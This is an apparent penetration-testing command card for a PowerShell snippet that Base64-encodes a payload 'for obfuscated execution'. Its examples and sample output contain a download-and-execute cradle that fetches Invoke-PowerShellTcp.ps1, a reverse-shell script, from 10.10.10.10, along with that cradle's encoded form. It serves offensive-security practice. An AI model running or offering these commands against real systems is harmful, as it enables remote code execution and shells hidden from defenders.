---
id: 9313e70d-e9d4-40a1-b2b1-a9efef14db94
name: powershell-base64-encode-string
type: command
executor: powershell
data: |-
  $Text = "$_PAYLOAD"
  $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
  $EncodedText=[Convert]::ToBase64String($Bytes)
  $EncodedText
output: >-
  $Text = "iex (New-Object
  Net.WebClient).downloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1')"

  $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

  $EncodedText=[Convert]::ToBase64String($Bytes)

  $EncodedText


  aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAwAC8ASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwAC4AcABzADEAJwApAA==
created_at: '2019-11-13T23:17:32.929399+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Windows
tags:
  - encode
  - base64
  - powershell
verified: true
validated: true
---

# powershell-base64-encode-string

## Command

```powershell
$Text = "$_PAYLOAD"
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText=[Convert]::ToBase64String($Bytes)
$EncodedText
```

## Description

This PowerShell command encodes a given string payload into Base64 after converting it to Unicode (UTF-16) bytes, preparing it for obfuscated execution on Windows systems.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_PAYLOAD | The string to encode (e.g., PowerShell command) | Yes |
| [System.Text.Encoding]::Unicode | Specifies UTF-16 encoding for bytes conversion | Built-in |
| [Convert]::ToBase64String | Converts byte array to Base64 string | Built-in |

## Examples

### Basic Usage

```powershell
$Text = "Get-Date"
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText=[Convert]::ToBase64String($Bytes)
$EncodedText
```

### Advanced Usage

```powershell
$Text = "iex (New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')"
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText=[Convert]::ToBase64String($Bytes)
$EncodedText
```

## Expected Output

Description of what output to expect when the command runs successfully.

```
$Text = "iex (New-Object Net.WebClient).downloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1')"
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText=[Convert]::ToBase64String($Bytes)
$EncodedText

aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAwAC8ASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwAC4AcABzADEAJwApAA==
```

## Related

- [[procedures/Encode-and-Execute-Base64-PowerShell-Command]]
- [[commands/iconv-encode-string-utf16-base64]]
